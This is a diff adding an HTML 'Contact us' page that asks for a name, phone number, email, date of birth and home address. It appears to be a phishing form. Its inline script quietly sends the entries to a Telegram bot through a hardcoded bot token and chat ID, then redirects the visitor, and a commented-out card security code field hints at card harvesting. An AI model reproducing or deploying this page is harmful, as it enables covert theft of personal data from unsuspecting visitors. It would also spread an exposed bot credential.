@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Conatct us</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@100;300;400;500;600&display=swap" rel="stylesheet">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+        
+        body {
+            background: #f4f7fc;
+            color: #333;
+            font-size: 14px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 700px;
+            background: #fff;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            border-radius: 20px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            height: 80vh; /* Fixed height to enable scrolling */
+        }
+
+        .form-container {
+            padding: 30px;
+            overflow-y: auto;
+            flex-grow: 1; /* Allows form to fill available space */
+        }
+
+        .form-title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1d1d1f;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .form-subtitle {
+            font-size: 14px;
+            text-align: center;
+            color: #888;
+            margin-bottom: 20px;
+        }
+
+        .inputBox {
+            margin-bottom: 15px;
+        }
+
+        .inputBox span {
+            display: block;
+            font-weight: 500;
+            margin-bottom: 5px;
+            color: #555;
+        }
+
+        .inputBox input {
+            width: 100%;
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid #ccc;
+            font-size: 14px;
+            transition: all 0.3s ease;
+        }
+
+        .inputBox input:focus {
+            border-color: #007bff;
+            box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
+        }
+
+        .flex {
+            display: flex;
+            gap: 15px;
+        }
+
+        .submit-btn {
+            width: 26%;
+            padding: 12px;
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            font-size: 14px;
+            font-weight: 500;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            display: block;
+            margin-left: auto;
+        }
+
+        .submit-btn:hover {
+            background-color: #0056b3;
+        }
+
+        .footer {
+           box-shadow: 0 4px 15px rgba(1, 1, 1, 0.1);
+            padding: 15px;
+            text-align: center;
+            font-size: 12px;
+        }
+
+        @media (max-width: 600px) {
+            .flex {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="form-container">
+            <h3 class="form-title">Let us get to know you</h3>
+          
+            <div class="inputBox">
+				<h3>Names</h3>
+                <input type="text" placeholder="First Name/Last Name">
+            </div>
+            <h3>Mobile Number</h3>
+            <div class="inputBox">
+                <input type="number" placeholder="5555 5555 5555" required>
+            </div>
+
+			<h3>Email</h3>
+            <div class="inputBox">
+                <input type="text" placeholder="email" required>
+            </div>
+            <div class="flex">
+                <div class="inputBox">
+					
+                    <span>Date of Birth:</span>
+                    <input type="text" placeholder="MM/YYYY" required>
+                </div>
+                <!-- <div class="inputBox">
+                    <span>Security Code:</span>
+                    <input type="number" placeholder="CVC" required>
+                </div> -->
+            </div>
+
+            <h3>Residential Address</h3>
+            <!-- <div class="flex">
+                <div class="inputBox">
+                    <input type="text" placeholder="First Name" required>
+                </div>
+                <div class="inputBox">
+                    <input type="text" placeholder="Last Name" required>
+                </div>
+            </div> -->
+
+            <div class="inputBox">
+                <input type="text" placeholder="Street" required>
+            </div>
+            <div class="inputBox">
+                <input type="text" placeholder="Apt/Optional">
+            </div>
+            <div class="inputBox">
+                <input type="text" placeholder="City" required>
+            </div>
+        
+                <div class="inputBox">
+                    <input type="text" placeholder="State" required>
+                </div>
+                <div class="inputBox">
+                    <input type="text" placeholder="Zip" required>
+                </div>
+        </div>
+
+        <footer class="footer">
+             <button type="submit" class="submit-btn" id="submit-btn">Send</button>
+        </footer>
+    </div>
+    <script>
+        document.getElementById("submit-btn").addEventListener("click", function(event) {
+            event.preventDefault(); // Prevent form submission
+    
+            // Collect input values
+            const names = document.querySelector("input[placeholder='First Name/Last Name']").value;
+            const mobileNumber = document.querySelector("input[placeholder='5555 5555 5555']").value;
+            const email = document.querySelector("input[placeholder='email']").value;
+            const street = document.querySelector("input[placeholder='Street']").value;
+            const apt = document.querySelector("input[placeholder='Apt/Optional']").value;
+            const city = document.querySelector("input[placeholder='City']").value;
+            const state = document.querySelector("input[placeholder='State']").value;
+            const zip = document.querySelector("input[placeholder='Zip']").value;
+    
+            // Format message to send to Telegram
+            const message = `
+            📝 New Submission:
+            👤 Names: ${names}
+            📞 Mobile Number: ${mobileNumber}
+            📧 Email: ${email}
+            🏠 Address: ${street}, 
+            🏠  Apt: ${apt}, 
+            🏠 City: ${city}, 
+            🏠 State: ${state}, 
+            🏠 ZipCode: ${zip}
+            `;
+    
+            // Send the message to Telegram Bot
+            sendToTelegram(message);
+        });
+    
+        function sendToTelegram(message) {
+            const botToken = '8173221834:AAHB3x2VDBnWtWUrgGzwGVFluQkSIuzhuNQ'; // Replace with your bot's token
+            const chatId = '7858060567'; // Replace with your chat ID
+    
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const data = {
+                chat_id: chatId,
+                text: message
+            };
+    
+            // Use fetch to send the data
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    window.location.href = './index.html'; // Redirect after successful submission
+                } else {
+                    alert('Failed to send data to Telegram');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Error sending data');
+            });
+        }
+    </script>
+    
+</body>
+</html>
